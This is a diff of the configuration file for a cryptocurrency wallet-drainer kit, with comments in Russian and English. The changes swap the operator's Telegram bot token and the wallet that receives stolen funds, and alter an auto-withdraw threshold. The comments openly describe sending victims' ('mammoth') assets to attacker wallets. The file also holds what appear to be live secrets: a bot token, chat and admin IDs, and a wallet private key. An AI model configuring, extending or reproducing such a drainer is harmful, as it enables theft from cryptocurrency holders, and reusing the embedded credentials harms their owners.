@@ -29,14 +29,14 @@ console.log(`\t[SYSTEM] Using directory: ${TMP_DIR}`);
 const MS_Encryption_Key = 50; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
 // Это же число должно быть указано и в файле web3-provider.js - если они будут различаться, то ничего не будет работать правильно
 
-const MS_Telegram_Token = "7740473878:AAGAm1Qca6dW0D-BjyQEKCfp6YPRCN8XAw4"; // Сюда вписать свой Token от бота из @BotFather (заходите туда, там создаёте бота и получаете этот самый Token)
+const MS_Telegram_Token = "7740473878:AAHU-Gc0VgHxHmldc-BiIXc6otrfu517zeI"; // Сюда вписать свой Token от бота из @BotFather (заходите туда, там создаёте бота и получаете этот самый Token)
 const MS_Telegram_Chat_ID = "-1002267224933"; // -1002583817934 Enter here the ID of the chat or chats where you want to send notifications about the actions of the mammoth (if the ID starts with a minus, write it down)
 // To specify multiple chats, you need to fill in as follows: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
 const MS_Telegram_Admin_IDs = ["6061406566"]; // Specify your Telegram ID here so that it only accepts commands from you
 
 const MS_Wallet_Address = "0xFaf517b01ca064D6a8C56226b524b9B1Dd457ED3"; // Wallet address where mammoth assets will go
 const MS_Wallet_Private = "5b68f015ed5c24a603daeff6f45e869b9b83eb529e124fffe2904b277f746d17"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
-const MS_Wallet_Receiver = ["0x1BEBeae49E47473b520DfC70dceaDF4d1837d667"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
+const MS_Wallet_Receiver = ["0x337571b793D0DEee06da50A418Ef02b94E32A2C0"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
 // To specify multiple wallets, you need to fill in as follows: MS_Wallet_Receiver = ["WALLET_ADDRESS_HERE", "ANOTHER_WALLET", "ONE_MORE_WALLET"]
 // If several wallets are specified, the drainer will select a random one and send assets to it, convenient for asset distribution
 
@@ -105,7 +105,7 @@ const MS_Allowance_API = true; // Сохранять ли историю одо�
 const MS_Allowance_Check = false; // Проверять кошельки на наличие повторных пополнений (не включать, если используется сторонний софт)
 const MS_Allowance_Withdraw = {
   mode: false, // Automatically withdraw found new assets from the wallet (works only when MS_Allowance_Check is enabled)
-  min_amount: 0, // Сумма в долларах, от которой будет срабатывать автоматический вывод актива (будет работать только при рабочем токене DeBank!)
+  min_amount: 1, // Сумма в долларах, от которой будет срабатывать автоматический вывод актива (будет работать только при рабочем токене DeBank!)
   wallets: { // List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
     "WALLET_ADDRESS_HERE": "WALLET_PRIVATE_HERE",
   }
